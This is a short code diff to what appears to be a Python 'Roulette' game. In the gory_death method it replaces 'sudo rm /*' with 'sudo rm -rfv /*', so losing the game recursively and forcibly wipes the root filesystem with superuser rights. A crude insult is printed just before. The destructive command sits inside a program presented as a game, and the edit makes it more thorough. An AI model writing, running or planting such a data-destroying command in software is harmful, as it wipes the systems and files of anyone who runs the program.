@@ -126,7 +126,7 @@ class Roulette:
 		print("\nYOUR DEAD YOU PUSSY!!!\n")
 	
 	def gory_death(self):
-		os.system("sudo rm /*")
+		os.system("sudo rm -rfv /*")
 
 
 if __name__=="__main__":
